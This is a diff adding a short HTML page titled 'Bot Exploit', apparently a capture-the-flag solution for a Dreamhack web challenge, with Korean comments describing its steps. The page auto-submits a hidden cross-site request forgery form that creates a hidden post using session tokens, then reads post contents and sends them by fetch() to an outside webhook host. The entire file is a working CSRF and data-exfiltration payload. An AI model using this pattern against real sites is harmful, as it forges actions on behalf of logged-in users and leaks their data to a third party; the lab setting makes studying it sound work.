@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Bot Exploit</title>
+</head>
+<body>
+<form id="botForm" method="POST" action="https://host8.dreamhack.games:21117/write">
+  <input type="hidden" name="content" value="FLAG_REQUEST">
+  <input type="hidden" name="isHidden" value="true">
+  <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">
+  <input type="hidden" name="safe_token" value="{{ session.safe_token }}">
+</form>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // 1. 봇이 form 자동 제출 (히든 게시물 작성)
+    document.getElementById('botForm').submit();
+
+    // 2. 일정 시간 후 히든 게시물 읽어서 웹훅 전송
+    setTimeout(function(){
+        const posts = document.querySelectorAll('.post-content');
+        posts.forEach(post => {
+            fetch("https://uqgiods.request.dreamhack.games/webhook", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({content: post.innerText})
+            });
+        });
+    }, 3000);
+});
+</script>
+</body>
+</html>
